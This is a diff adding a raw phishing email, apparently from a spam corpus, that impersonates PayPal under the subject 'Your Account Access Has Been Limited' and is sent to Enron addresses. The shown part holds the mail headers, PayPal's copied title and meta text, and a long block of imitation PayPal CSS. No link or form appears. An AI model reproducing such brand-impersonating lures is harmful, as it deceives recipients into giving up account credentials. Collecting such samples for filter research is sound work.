@@ -1,0 +1,835 @@
+Return-Path: <test@attack.com>
+From: insynconline.6czmxfks.d@test.insync-palm.com
+To: f..calger@enron.com, tim.belden@enron.com, jeff.richter@enron.com, 
+Subject: Your Account Access Has Been Limited
+Date: Wed, 28 Nov 2007 00:02:07 -0500
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--2655954088913741"
+X-IP: 39.36.211.34
+Content-Length: 39860
+Lines: 819
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 423
+
+----2655954088913741
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<head>
+<title>PayPal - Limited Account Access Details</title><meta http-equiv=3D"=
+description" content=3D"PayPal lets you send money to anyone with email. P=
+ayPal is free for consumers and works seamlessly with your existing credit=
+ card and checking account. You can settle debts, borrow cash, divide bill=
+s or split expenses with friends all without going to an ATM or looking fo=
+r your checkbook."><meta http-equiv=3D"keywords" content=3D"Send, money, p=
+ayments, credit, credit card, instant, money, financial services, mobile, =
+wireless, WAP, cell phones, two-way pagers, Windows CE">
+<style type=3D"text/css">
+BODY, TD, DIV {font-size: 13px; font-family: verdana,arial,helvetica,sans-=
+serif; font-weight: 400; color: #000;}
+BODY {background-color: #fff; margin: 0px 10px 0px 10px;}
+FORM {margin: 0px; display: inline;}
+HR {margin: 8px 0px 5px 0px; border-top: solid 1px #999; border-bottom: so=
+lid 1px #999; size: 2px; color: #036;}
+INPUT.default {font-size: 13px; border-style: outset; color: #000; backgro=
+und-color: #ccc;}
+INPUT.mediumText {font-size: 12px; border-style: outset; color: #000; back=
+ground-color: #ccc;}
+INPUT.loginButton {font-size: 13px; background-color: #ff0000; letter-spac=
+ing:-2px;} 
+INPUT.hotButton {font-size: 13px; background-color: #cccccc; border-style:=
+ outset; color: #000000; font-weight: 700} 
+INPUT.emphasis {font-size: 13px; font-weight: 700;}
+INPUT.small {font-size: 11px; font-weight: 400}
+INPUT.smallButton {font-size: 11px; border-style: outset; color: #000; bac=
+kground-color: #ccc;}
+input.smallInputWidth, select.smallInputWidth {width: 225px;}
+input.mediumInputWidth, select.mediumInputWidth {width: 255px;}
+INPUT.textRight {text-align: right;}
+input.securityInputWidth, select.securityInputWidth {width: 282px;}
+INPUT.textLong {font-size: 13px; font-family: verdana,arial,helvetica,sans=
+-serif; font-weight: 400; width: 282;}
+SELECT.optionsLong {font-size: 13px; font-family: verdana,arial,helvetica,=
+sans-serif; font-weight: 400; width: 282;}
+globalButtons INPUT {font-size: 13px; margin-left: 13px; color: #000;}
+globalButtonsLeft INPUT {font-size: 13px; margin-right: 13px; color: #000=
+;}
+Input.globalButtonsSmall {font-size: 11px; color: #000;}
+Input.transparentButton { margin: 0px 0px 0px 0px; border: none; backgroun=
+d-color: #ffffff; text-decoration: underline; color:#03c; padding-left: 0p=
+x; padding-right: 0px; text-align: left;cursor: pointer; cursor: hand;}
+A {color: #03c;}
+HR.dotted {width: 100%; margin-top: 10px; margin-bottom: 15px; border-left=
+: 1px #000; border-right: #000; border-top: #000; border-bottom: 2px dotte=
+d #aaa;}
+HR.dottedNoPadding {width: 100%; margin: 0px; padding: 0px; border-left: #=
+fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #aaa;=
+}
+HR.dottedWhite {width: 100%; margin-top: 0px; margin-bottom: 0px; border-l=
+eft: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted=
+ #fff;}
+HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: #=
+fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid #999;}=
+
+HR.solidGreen {margin: 0px 0px 0px 0px; border-top: solid 1px #fff; border=
+-bottom: solid 1px #C1DBB9;}
+HR.SolidLightGreen {margin: 2px 0px 6px 0px; border-top: solid 0px #C7D6BF=
+; border-bottom: solid 0px #C7D6BF; size: 1px; color: #C7D6BF;}
+HR.solidSmall {margin: 8px 0px 6px 0px; border-top: solid 1px #999; border=
+-bottom: solid 1px #999; size: 1px; color: #036;}
+DIV.floatLeft {float: left; padding: 0px 15px 15px 0px;}
+DIV.floatLeft {float: left; padding: 0px 15px 15px 0px;}
+DIV.floatRight {float: right; padding: 0px 0px 15px 15px;}
+DIV.floatCenter {width: 100%; text-align: center; padding: 0px 0px 15px 15=
+px;}
+DIV.textCenter {width: 100%; text-align: center;}
+DIV.textLeft {width: 100%; text-align: left;}
+DIV.textRight {width: 100%; text-align: right;}
+DIV.indented {margin: 0px 20px 0px 20px;}
+DIV.instructions {width: 100%; line-height; 13px }
+CODE, .codeSample {font-family: 'Courier New',monospaced; font-size: 13px;=
+ font-weight: 400;}
+IMG.greyBorder {border: 1px solid #ccc;}
+BR.textspacer  {font-size: 20px; line-height: 20px;}
+BR.fieldspacer  {font-size: 28px; line-height: 28px;}
+BR.fieldspaceropt      {font-size: 35px; line-height: 35px;}
+BR.h10         {font-size: 10px; line-height: 10px;}
+BR.h5         {font-size: 5px; line-height: 5px;}
+BR.h35  {font-size: 35px; line-height: 35px;}
+BR.clearAll { clear: all; }
+default { color: #000; }
+defaultsmall { font-size: 11px; color: #000; }
+inlinebluesmall { font-size: 10px; color: #00f; }
+optional {font-weight: 400;} 
+small {font-size: 11px; font-weight: 400;} 
+smallMediumGrey2 {font-size: 11px; font-weight: 400; color: #666;} 
+smallBlack {font-size: 11px; font-weight: 400; color: #000;} 
+smallDarkGrey2 {font-size: 11px; font-weight: 400; color: #999;} 
+smallWhite {font-size: 11px; font-weight: 400; color: #fff;} 
+default { color: #000; }
+defaultsmall { font-size: 11px; color: #000; }
+smaller {font-size: 10px; font-weight: 400;} 
+smallerEmphasis {font-size: 10px; font-weight: 700;} 
+smallHighlight {font-size: 11px; font-weight: 400; color: #036;}
+medium {font-size: 15px; font-weight: 400;}
+emphasis {font-weight: 700;}
+italic {font-style: italic;}
+emphasisWhite {font-weight: 700; color: #fff;}
+emphasisHighlight {font-weight: 700; color: #036;}
+smallemphasis {font-size: 11px; font-weight: 700;}
+smallemphasisHighlight {font-size: 11px; font-weight: 700; color: #036;}
+mediumemphasis {font-size: 14px; font-weight: 700;}
+inactiveEmphasis {font-size: 10px; color: #999; font-weight: 700;}
+activeEmphasis {font-size: 10px; color: #369; font-weight: 700;}
+large {font-size: 17px;} 
+extraLarge {font-size: 24px;}
+extraLargeEmphasis {font-size: 24px; font-weight: 700;}
+largeemphasis {font-size: 17px; font-weight: 700;} 
+caption {font-size: 11px; color: #336699;}
+superheading {font-size: 21px; font-weight: 700; color: #036;}
+heading {font-size: 17px; font-weight: 700; color: #036;}
+subheading {font-size: 15px; font-weight: 700; color: #036;}
+subheadingClickthrough, .subheadingPopup {font-weight: 700;}
+hidden {visibility: hidden; display: none;}
+smallRed {font-size: 11px; font-weight: 400; color: #C60000}
+smallRedEmphasis {font-size: 11px; font-weight: 700; color: #C60000}
+inactive {font-size: 13px; color: #999; font-weight: 400;}
+plainBox { width: 300px; height: 20px; border: solid 1px; border-color: #=
+999; padding-left: 3px; }
+digitBox { width: 16px; height: 20px; border: solid 1px; border-color: #9=
+99; }
+largeBox { width: 570px; border: solid 1px; border-color: #999; padding: =
+4px; }
+signatureBox { width: 270px; height: 80px; border: solid 1px; border-colo=
+r: #999; padding: 4px; }
+addressBox, .zipBox { height: 20px; border: solid 1px; border-color: #999=
+; padding-left: 3px; }
+editableBox { height: 20px; border: solid 1px; border-color: #999; paddin=
+g-left: 3px; background: #ffffcc; }
+borderBoxType {border-style: solid; border-color: #aaaaaa; border-width: =
+1px 1px 1px 1px; padding: 2px;}
+separationLine {background-color: #999;}
+inlineRed {color: #f00;}
+inlineBlue {color: #00f;}
+inlinePayPalBlue {color: #336699;}
+inlinebluesmall { font-size: 10px; color: #00f; }
+inlineBlue1 {color: #ccc;}
+inlineMediumGrey {color: #777777;}
+inlineMediumGrey2 {color: #666666;}
+inlineWhite {color: #fff;}
+inlineGrey {color: #666;}
+inlineDarkGrey {color: #aaa;}
+inlineDarkGrey2 {color: #999;}
+error {color: #f00;}
+errorEmphasis {color: #f00; font-weight: 700;}
+smallError {color: #f00; font-size: 11px;}
+smallErrorEmphasis {color: #f00; font-weight: 700; font-size: 11px;}
+educationModulePadding {padding-left: 15; padding-top: 5; padding-right: =
+15;}
+educationModuleFileClaimPadding {padding-left: 5; padding-bottom: 5;}
+educationModuleRespondClaimPadding {padding-left: 18; padding-bottom: 5;}=
+
+inlineSubheadingBlue {color: #036;}
+inlineyellowbg {background-color: #ffc;}
+inlinelightgreybg    {background-color: #e6e6e6;}
+inlinedisabled       {color: #999;}
+notificationborder {background-color: #003366;}
+notificationbg {background-color: #EFF7FE;}
+hint {font-size: 10;}
+linkTypeSmall {font-size: 11px; font-weight: 400; text-decoration: underl=
+ine; color: #03c;}
+alignBottom {vertical-align: bottom;}
+bulletsNoIndent {margin-left: 1em; padding-left: 1em;}
+notificationBox {width: 100%; background-color: #EFF7FE; border: 1px soli=
+d #003366;}
+alertBox {width: 100%; background-color: #FFFFCC; border: 1px solid #CCCC=
+33;}
+confirmationBox {width: 100%; background-color: #FFFFCC; border: 1px soli=
+d #CCCC33;}
+openIssuesBox {width: 100%; background-color: #FFEEEE; border: 1px solid =
+#CC9999;}
+saveInformationPadding {padding-left: 153px;}
+saveInformationPadding2 {padding-left: 5px;}
+saveInformationPadding3 {padding-left: 156px;}
+separationLine {background-color: #999;}
+subtabtexton {font-size: 11px; font-weight: 700; font-family: verdana,hel=
+vetica,arial,sans-serif; color: #003366; text-decoration: none;}
+headerBorder {font-size: 11px; background-color: #f9f9f9; border-color: #=
+ccc; border-width: 1px 0px 1px 0px; border-style: solid; padding: 5px}
+@media print { #buttonDiv {display: none;} } 
+verticalSpacerLow {height: 5px;}
+verticalSpacerMedium {height: 10px;}
+verticalSpacerHigh {height: 20px;}
+#xptHeader {width: 100%; margin: 0px;}
+#xptHeader TABLE {width: 600px;}
+#xptHeader TR {vertical-align: middle;}
+#xptHeader TD.cobrand {font-size: 21px; font-weight: 700; color: #036;}
+#xptHeader .emphasis {font-weight: 700;}
+xptHeader {width: 600px;}
+#smallID TD {font-size: 11px; font-weight: 400;} 
+#smallBlackID TD {font-size: 11px; font-weight: 400; color: #000;}
+#smallemphasisBlackID TD {font-size: 11px; font-weight: 700; color: #000;}=
+  
+#smallemphasisID TD {font-size: 11px; font-weight: 700;}
+#xptContentInnerWAX {width: 760px; margin-left: auto; margin-right: auto; =
+text-align: center;} 
+#xptTabs {font-size: 13px; text-align: center; background-image: url('/en_=
+US/i/nav/bg.gif'); height: 59px; margin-left:0px; margin-right:0px; margin=
+-top:17px; margin-bottom:10px}
+#xptTabs DIV.alignCenter { text-align: center; }
+#xptTabs DIV.alignCenter TABLE { margin-left: auto; margin-right: auto; te=
+xt-align: left; }
+#xptTabs TABLE.primary {width: 598px;}
+#xptTabs TABLE.secondary { width: 598px; margin: 4px 0px 0px 0px;}
+#xptTabsBlueBar {font-size: 13px; width: 100%; background-image: url('/en_=
+US/i/scr/bg_clk.gif');margin-left:0px; margin-right:0px; margin-top:5px; m=
+argin-bottom:10px}
+#xptErrorBox {width: 100%; margin: 0px 0px 10px 0px;}
+#xptErrorBox TABLE {border: 1px solid #aaa; width: 600px; background-color=
+: #ffc;}
+#xptErrorBox TR {vertical-align: top;}
+#xptErrorBox TD {padding: 4px;}
+#xptErrorBox P {padding-bottom: 0px; font-size: 13px; font-weight: 700; co=
+lor: #f00;}
+#xptErrorBox100percentWidth {width: 100%; margin: 0px 0px 10px 0px;}
+#xptErrorBox100percentWidth TABLE {border: 1px solid #aaa; width: 100=
+%; background-color: #ffc;}
+#xptErrorBox100percentWidth TR {vertical-align: top;}
+#xptErrorBox100percentWidth TD {padding: 4px;}
+#xptErrorBox100percentWidth P {padding-bottom: 0px; font-size: 13px; font-=
+weight: 700; color: #f00;}
+#xptErrorModerateBox {width: 100%; margin: 0px 0px 10px 0px;}
+#xptErrorModerateBox TABLE {border: 1px solid #aaa; width: 600px; backgrou=
+nd-color: #fff;}
+#xptErrorModerateBox TR {vertical-align: top;}
+#xptErrorModerateBox TD {padding: 4px;}
+#xptErrorModerateBox P {padding-bottom: 0px; font-size: 13px; font-weight:=
+ 700;}
+#xptMessageBox {width: 100%; margin: 0px 0px 10px 0px;}
+#xptMessageBox TABLE {border: 1px solid #aaa; width: 600px; background-col=
+or: #ffc;}
+#xptMessageBox TR {vertical-align: top;}
+#xptMessageBox TD {padding: 4px;}
+#xptMessageBox P {padding-bottom: 0px; font-size: 13px; font-weight: 700;}=
+
+#xptNotificationBox {width: 100%; margin: 0px 0px 10px 0px;}
+#xptNotificationBox TABLE {border: 1px solid #aaa; width: 600px;}
+#xptNotificationBox TR {vertical-align: top;}
+#xptNotificationBox TD {padding: 4px;}
+#xptNotificationBox P {padding-bottom: 0px; font-size: 13px; font-weight: =
+700;}
+#xptSearchBox {border: solid 1px #ccc; background-color: #eee; margin-bott=
+om: 5px;}
+breadcrumbactive	{font-size: 10px; color: #003366; font-family: verdana,a=
+rial,helvetica,sans-serif; font-weight: 700; text-align: center;}
+breadcrumboff		{font-size: 10px;color: #999999;font-family: verdana,arial=
+,helvetica,sans-serif; font-weight : 700; text-align: center;}
+breadcrumbvisited  	{font-size: 10px; color: #990099; font-family: verdan=
+a,arial,helvetica,sans-serif; font-weight : 700; text-align: center;}
+#xptTitle {width: 100%; margin: 0px;}
+#xptTitle TABLE.main {width: 100%;}
+#xptTitle TABLE.default {width: 600px;}
+#xptTitle TABLE.popup {width: 100%; margin: 5px 0px 0px 0px;}
+#xptTitle TD.heading {font-size: 17px; font-weight: 700; color: #036;}
+#xptTitle HR {margin: 0px;}
+#xptTitle .inlineSmallBlue {color: #369; font-size: 11px; font-weight: 700=
+;}
+#xptContentOuter {width: 100%; text-align: center;}
+#xptContentInner {width: 600px; margin-left: auto; margin-right: auto; tex=
+t-align: left;}
+#xptContentInnerWAX {width: 760px; margin-left: auto; margin-right: auto; =
+text-align: center;}
+#xptContentInnerPopup {width: 100%; text-align: left; padding: 5px 10px 5p=
+x 10px;}
+#xptContentLeft {width: 150px;} /* homepage only */
+#xptContentInner TD.lefty {width: 150px;}
+#xptContentInner TD.spacer {width: 10px;}
+#xptContentInner TD.righty {width: 440px;}
+#xptContentMain {width: 100%; font-size: 13px; padding-left: 10px; padding=
+-right: 10px;}
+#xptContentMain DIV {font-size: 13px;}
+#xptContentMain P {font-size: 13px; margin: 0px 0px 16px 0px;}
+#xptContentMain P.box {border: solid #aaa 1px; padding: 3px; margin: 3px 0=
+px 3px 0px;}
+#xptContentMain P.lastPara {font-size: 13px; margin: 0px;}
+#xptContentMain .emphasis {font-weight: 700;}
+#xptContentMain .small {font-size: 11px;}
+#xptContentMain .smallemphasis {font-size: 11px; font-weight: 700;}
+#xptContentMain P.heading {font-size: 17px; font-weight: 700; color: #036;=
+ margin: 0px;}
+#xptContentMain P.subheading {font-size: 15px; font-weight: 700; color: #0=
+36; margin: 0px}
+#xptContentMain P.subheadingClickthrough {font-weight: 700; margin: 0px;}
+#xptContentMain P.subheadingPopup {font-weight: 700; margin: 0px;}
+#xptContentMain OL.paddedList LI {padding: 0px 0px 12px 0px;}
+#xptContentMain UL.paddedList LI {padding: 0px 0px 12px 0px;}
+#xptContentMain OL.paddedListHalf LI {padding: 0px 0px 6px 0px;}
+#xptContentMain UL.paddedListHalf LI {padding: 0px 0px 6px 0px;}
+#xptContentMain UL.ListGrey LI {padding: 0px 0px 0px 0px; color: #666;}
+#xptContentMain TABLE.defaultWidth {width: 600px;}
+#xptClickthroughFooter {width: 100%; margin: 6px 0px 0px 0px;}
+#xptClickthroughFooter TABLE {width: 600px;}
+#xptClickthroughFooter INPUT {font-size: 13px; margin-left: 13px; color: #=
+000; background-color: #ccc;}
+#xptClickthroughFooter HR {padding: 0px; margin: 0px 0px 5px 0px; border-t=
+op: solid 1px #999; border-bottom: solid 1px #999; size: 2px; color: #036;=
+ width: 100%;}
+#xptFootnote {width: 100%; margin: 20px 0px 20px 0px;}
+#xptFootnote TABLE {width: 600px;}
+#xptFootnote P {font-size: 11px;}
+#xptFooter {width: 100%; margin: 24px 0px 0px 0px;}
+#xptFooter TABLE {width: 600px;}
+#xptFooter TD {text-align: center;}
+#xptFooter P {font-size: 11px; margin: 0px 0px 12px 0px;}
+#xptFooter P.lastPara {font-size: 11px; margin: 0px;}
+#xptFooter A.ebayLink {font-size: 13px; font-weight: 700; color: #03c;}
+#xptWAXFooter {width: 100%; margin-top: 35px;}
+#xptWAXFooter TABLE {width: 760px;}
+#xptWAXFooter TD {text-align: center; font-size: 11px;}
+#xptWAXFooter P {font-size: 11px;}
+#xptWAXFooter TD.greyNote {font-size: 11px; margin: 0px; color: #999;}
+#xptWAXFooter P.greyNote {font-size: 11px; margin: 0px; color: #999;}
+#xptPopupFooter {width: 100%; margin: 0px;}
+#xptPopupFooter TABLE {width: 100%;}
+#xptPopupFooter TD {text-align: center;}
+#xptPopupFooter P {font-size: 11px; margin: 0px 0px 12px 0px;}
+#xptPrivacy {width: 100%; text-align: center; margin-top: 24px;}
+#xptPrivacy A {padding: 20px;}
+#xptLoginBox {width: 100%; background-color: #eee; border: 1px solid #ccc;=
+ border-collapse: collapse; margin-bottom: 12px;}
+#xptLoginBox TD {width: 100%; font-size: 11px; padding: 8px 10px 0px 10px;=
+}
+#xptLoginBox TD.head {width: 100%; font-size: 13px; font-weight: 700; back=
+ground-color: #ccc; padding: 5px;}
+#xptLoginBox TD.buttons {width: 100%; text-align: right;}
+#xptLoginBox TD.arrow {font-size: 12px; padding: 8px 10px 5px 0px;}
+#xptLoginBox A {display: block; padding-bottom: 6px; text-align: center;}
+#xptLoginBox INPUT.fields {width: 130px;}
+#xptInfoBox {width: 100%; background-color: #eee; border: 1px solid #ccc; =
+border-collapse: collapse; margin-bottom: 12px;}
+#xptInfoBox TD.head {width: 100%; font-size: 13px; font-weight: 700; backg=
+round-color: #ccc; padding: 5px;}
+#xptInfoBox A {font-size: 11px; display: block; padding: 8px}
+#xptHomepageAlert {width: 100%; line-height: 30px; font-size: 17px; font-w=
+eight: 700; text-align: center; background-color: #ffffcc; border: 1px sol=
+id #cccc33; margin-bottom: 15px;}
+#xptHomepageTitles {width: 100%; font-weight:700; background-color: #eee; =
+border-bottom: 1px solid #ccc; padding: 5px; margin-bottom: 15px;}
+#xptCardIcons TD {font-size: 2px;}
+globalButtons INPUT {font-size: 13px; margin-left: 13px; color: #000;}
+globalButtonsLeft INPUT {font-size: 13px; margin-right: 13px; color: #000=
+;}
+paddedHeaderBorder {font-size: 11px; font-family: verdana,arial,helvetica=
+,sans-serif; font-weight: 400; background-color: #F9F9F9; border-color: #C=
+CC; border-width: 1px 0px 1px 0px; border-style: solid; padding: 5px;}
+singleBorderLine {border-color: #CCC; border-width: 1px 0px 0px 0px; bord=
+er-style: solid;}
+#xptDashBoardHeader TD, DIV {font-size: 11px; font-family: verdana,arial,h=
+elvetica,sans-serif; font-weight: 700;}
+#xptDashBoardHeader TD {background-color: #ccddee; font-weight: 700;}
+#xptDashBoardBody TD, DIV {font-size: 11px; font-family: verdana,arial,hel=
+vetica,sans-serif; font-weight: 400;}
+#xptDashBoardBody TD.emphasis, DIV.emphasis {font-size: 11px; font-family:=
+ verdana,arial,helvetica,sans-serif; font-weight: 700;}
+#xptDemo {width: 100%; background-color: #fff;}
+#xptDemo TABLE {width: 420px;}
+#xptDemo TABLE.theNav {margin: 5px 0px 0px 0px;}
+#xptDemo TD {font-size: 13px; font-weight: 400; color: #000;}
+#xptDemo TD.nav {font-size: 13px; font-weight: 700; color: #000;}
+#xptDemo TD.navoff {font-size: 13px; font-weight: 700; color: #aaa;}
+#xptDemo IMG.grey {border: 1px solid #aaa;}
+#xptDemo TD.theText {padding: 15px 0px 0px 0px;}
+#xptDemo TD.theImage {padding: 15px 0px 15px 0px;}
+TABLE.formTable {width: 100%;}
+formTable TD {font-size: 13px; font-weight: 400; padding-bottom: 4px;}
+formTable TD.label {vertical-align: text-top; text-align: right; font-siz=
+e: 11px; font-weight: 700; padding-top: 1px;}
+formTable TD.topSpacer {padding: 0px;}
+formTable TD.labelError {vertical-align: text-top; text-align: right; fon=
+t-size: 11px; font-weight: 700; padding-top: 1px; color: #ff0000;}
+label {vertical-align: text-top; text-align: right; font-size: 11px; font=
+-weight: 700; padding-top: 1px;}
+labelError {vertical-align: text-top; text-align: right; font-size: 11px;=
+ font-weight: 700; padding-top: 1px; color: #ff0000;}    
+labelLeft {vertical-align: text-top; text-align: left; font-size: 11px; f=
+ont-weight: 700; padding-top: 1px;}
+labelErrorLeft {vertical-align: text-top; text-align: left; font-size: 11=
+px; font-weight: 700; padding-top: 1px; color: #ff0000;}    
+#xptPaymentLoginBox {width: 100%; border-top: 1px dotted #ccc; border-bott=
+om: 1px dotted #ccc; border-collapse: collapse;}
+#xptPaymentLoginBox TD.divider {background-color: #999;}
+#xptPaymentLoginBoxNoBorder {width: 100%; border-top: none; border-bottom:=
+ none; border-collapse: collapse;}
+#xptPaymentLoginBoxNoBorder TD.divider {background-color: #999;}
+#xptPaymentLoginBoxWithBG {width: 100%; background-color: #eee; border: 1p=
+x solid #ccc; border-collapse: collapse;}
+#xptPaymentLoginBoxWithBG TD.divider {background-color: #999;}
+questionPadding {padding-bottom: 6px;}
+input.largeInputWidth, select.largeInputWidth {width: 325px;}
+SELECT.extraLargeInputWidth {width: 445px;}
+TEXTAREA.wide { width: 600px }
+dropdownlistWidth {width: 285px;}
+TEXTAREA.agreementSignup {width: 478px;}
+DIV.leftNotificationBox {width: 280px; background-color: #EFF7FE; border: =
+1px solid #003366; padding: 10px;}
+#xptLeftNav {border-top: solid 2px #ccc; border-left: solid 2px #ccc; bord=
+er-bottom: solid 1px #ccc; border-right: solid 1px #ccc; background-color:=
+ #fff;}
+#xptLeftNav TD {border-bottom: solid 1px #ccc; border-right: solid 1px #cc=
+c; font-size: 11px;}
+#xptLeftNav TD.heading {border-bottom: solid 1px #ccc; border-right: solid=
+ 1px #ccc; background-color: #eee; font-size: 13px; font-weight: 700; colo=
+r: #000;}
+#xptLeftNav TD.on {border-bottom: solid 1px #ccc; border-right: solid 1px =
+#ccc; background-color: #ffc;}
+#xptLeftNav TD.off {border-bottom: solid 1px #ccc; border-right: solid 1px=
+ #ccc; background-color: #fff;}
+#xptLeftNav TD.noDivider {border-bottom: solid 1px #fff; border-right: sol=
+id 1px #ccc;}
+#xptLeftNav TD.bottom {border-bottom: solid 1px #ccc; border-right: solid =
+1px #ccc; background-color: #eee; vertical-align: middle;}
+#xptLeftNav TD DIV {font-size: 11px; font-weight: 400;}
+#xptLeftNav TD.onAndNoDivider {border-bottom: solid 1px #fff; border-right=
+: solid 1px #ccc; background-color: #ffc;}
+#xptLeftNav TD.offAndNoDivider {border-bottom: solid 1px #fff; border-righ=
+t: solid 1px #ccc; background-color: #fff;}
+xptLeftNav {border-top: solid 2px #ccc; border-left: solid 2px #ccc; bord=
+er-bottom: solid 1px #ccc; border-right: solid 1px #ccc; background-color:=
+ #fff;}
+xptLeftNav TD {border-bottom: solid 1px #ccc; border-right: solid 1px #cc=
+c; font-size: 11px;}
+xptLeftNav TD.heading {border-bottom: solid 1px #ccc; border-right: solid=
+ 1px #ccc; background-color: #eee; font-size: 13px; font-weight: 700; colo=
+r: #000;}
+xptLeftNav TD.on {border-bottom: solid 1px #ccc; border-right: solid 1px =
+#ccc; background-color: #ffc;}
+xptLeftNav TD.off {border-bottom: solid 1px #ccc; border-right: solid 1px=
+ #ccc; background-color: #fff;}
+xptLeftNav TD.noDivider {border-bottom: solid 1px #fff; border-right: sol=
+id 1px #ccc;}
+xptLeftNav TD.bottom {border-bottom: solid 1px #ccc; border-right: solid =
+1px #ccc; background-color: #eee; vertical-align: middle;}
+xptLeftNav TD DIV {font-size: 11px; font-weight: 400;}
+xptLeftNavNoGrid {border: solid 2px #ccc; background-color: #fff;}
+xptLeftNavNoGrid TD {font-size: 11px;}
+xptLeftNavNoGrid TD.padded {padding: 5px;}
+xptLeftNavNoGrid TD.heading {border-bottom: solid 1px #ccc; background-co=
+lor: #eee; font-size: 13px; font-weight: 700; color: #000;}
+xptLeftNavBelow {border-right: solid 2px #ccc; border-bottom: solid 2px #=
+ccc; border-left: solid 2px #ccc;}
+xptLeftNavBelow TD {font-size: 11px; background-color: #dbe7f2;}
+#xptWAXHeader {width: 100%;}
+#xptWAXHeader TABLE.PayPalLogoRow {width: 750px; padding: 5px 0px 5px 0px;=
+}
+#xptWAXHeader TABLE.cowpImage {width: 750px; height: 90px;}
+#xptWAXHeader TABLE.cowpNoImage {width: 750px; height: 45px;}
+#xptWAXHeader TABLE.default {width: 600px; height: 50px;}
+#xptWAXHeader .cobrand {font-size: 17px; font-family: verdana,arial,helvet=
+ica,sans-serif; font-weight: 400; color: #000;} 
+#xptWAXHeader {width: 100%;}
+#xptWAXHeader TABLE.PayPalLogoRow {width: 760px; margin-top: 5px; margin-b=
+ottom: 5px;}
+#xptWAXHeader TABLE.cowpImage {width: 760px; height: 90px;}
+#xptWAXHeader TABLE.cowpNoImage {width: 760px; height: 45px;}
+#xptWAXHeader TABLE.default {width: 760px; height: 50px;}
+#xptWAXHeader .cobrand {font-size: 17px; font-family: verdana,arial,helvet=
+ica,sans-serif; font-weight: 400; color: #000;} 
+TABLE.tableWAXDefault {width: 760px;}
+waxLoginBG {color: #000; background-color: #FFF;}
+ppwaxloginborder {background-color: #000;}
+waxHeaderBG			{background-color: #cccccc;}	
+bcActive {font-size: 13px; color: #27537F; font-family: verdana,arial,hel=
+vetica,sans-serif; font-weight: 700; text-align: center;}  
+bcOff {font-size: 13px; color: #606060; font-family: verdana,arial,helvet=
+ica,sans-serif; text-align: center;}  
+bcVisited {font-size: 13px; color: #27537F; font-family: verdana,arial,he=
+lvetica,sans-serif; text-align: center;}  
+bcLineActive {background-color: #27537F;}  
+bcLineOff {background-color: #b5b5b5;}  
+bcLineVisited {background-color: #27537F;}  
+textBackgroundHighlightEmphasis {font-size: 13px; font-family: verdana,ar=
+ial,helvetica,sans-serif; font-weight: 700; background-color: #ffff99; pad=
+ding: 5px;}  
+waxLogin { color: #aaaaaa; }
+waxLoginBackground { color: #ffffff; }
+waxTrustBox { border: solid #aaaaaa 2px; padding: 5px; height: 120px; }
+ pptextboldbghighlite     {font-size: 13px; font-family: verdana,arial,hel=
+vetica,sans-serif; font-weight: 700; background-color: #ffff99; padding: 5=
+px;}  
+TABLE.tableDarkGreyBackground { background-color: #aaa; }
+TABLE.tableGreyBackground { background-color: #ccc; }
+TABLE.tableBlackBorder {border-top: solid 1px #000; border-left: solid 1px=
+ #000; background-color: #fff;}
+TABLE.tableBlackBorder TD {border-bottom: solid 1px #000; border-right: so=
+lid 1px #000;}
+TABLE.tableDarkGreyBorder {border-top: solid 1px #aaa; border-left: solid =
+1px #aaa; background-color: #fff;}
+TABLE.tableDarkGreyBorder TD {border-bottom: solid 1px #aaa; border-right:=
+ solid 1px #aaa;}
+TABLE.tableDarkGreyBorderNoTD { border-left: solid 1px #aaa;border-bottom:=
+ solid 1px #aaa; border-right: solid 1px #aaa; background-color: #fff;}
+TABLE.tableDarkGreyDoubleBorder {border-top: solid 2px #aaa; border-left: =
+solid 2px #aaa; border-bottom: solid 1px #aaa; border-right: solid 1px #aa=
+a; background-color: #fff;}
+TABLE.tableDarkGreyDoubleBorder TD {border-bottom: solid 1px #aaa; border-=
+right: solid 1px #aaa;}
+TABLE.tableDarkGreyBorderless {border-top: solid 1px #aaa; border-left: so=
+lid 1px #aaa; border-right: solid 1px #aaa; background-color: #fff;}
+TABLE.tableDarkGreyBorderless TD {border-bottom: solid 1px #aaa;}	
+TABLE.tableGreyBorder {border-top: solid 1px #ccc; border-left: solid 1px =
+#ccc; background-color: #fff;}
+TABLE.tableGreyBorder TD {border-bottom: solid 1px #ccc; border-right: sol=
+id 1px #ccc;}
+TABLE.tableGreyOutsideBorder {border: solid 1px #ccc;}
+TABLE.tableLightGreyBorder {border-top: solid 1px #eee; border-left: solid=
+ 1px #eee; background-color: #fff;}
+TABLE.tableLightGreyBorder TD {border-bottom: solid 1px #eee; border-right=
+: solid 1px #eee;}
+TABLE.tableLightBlueBorder {border-top: solid 1px #dbe7f2; border-left: so=
+lid 1px #dbe7f2; background-color: #fff; border-bottom: solid 1px #dbe7f2;=
+ border-right:solid 1px #dbe7f2;}
+TABLE.tableGreenBorder {border-top: solid 1px #DBEBE1; border-left: solid =
+1px #DBEBE1; border-right: solid 1px #DBEBE1;border-bottom: solid 1px #DBE=
+BE1; background-color: #fff;}
+TABLE.tableNoBorder {border: 0px; background-color: #fff;}
+TABLE.tableNoBorder TD {border: 0px;}
+TABLE.tableBlueBorder {border-top: solid 1px #369; border-left: solid 1px =
+#369; }
+TABLE.tableYellowBorder {border-top: solid 1px #cc0; border-left: solid 1p=
+x #cc0; background-color: #ffc;}
+TABLE.tableYellowBorder TD {border-bottom: solid 1px #cc0; border-right: s=
+olid 1px #cc0;}
+TABLE.tableYellowBorderWhiteBG {border-top: solid 1px #cc0; border-left: s=
+olid 1px #cc0; background-color: #fff;}
+TABLE.tableYellowBorderWhiteBG TD {border-bottom: solid 1px #cc0; border-r=
+ight: solid 1px #cc0;}
+TABLE.tableDarkBlueBorder {border: solid 10px #369; background-color: #fff=
+;}
+TABLE.tableTransparentBorder {border: 0px;}
+TABLE.tableTransparentBorder TD {border-bottom: solid 0px #aaa; border-rig=
+ht: solid 0px #aaa;}
+TABLE.tableGreyBackground { background-color: #ccc; }
+TR.tableRowDarkGrey {background-color: #aaa;}
+TR.tableRowGrey {background-color: #ccc;}
+TR.tableRowLighterGrey {background-color: #f6f6f6;}
+TR.tableRowLightGrey {background-color: #eee;}
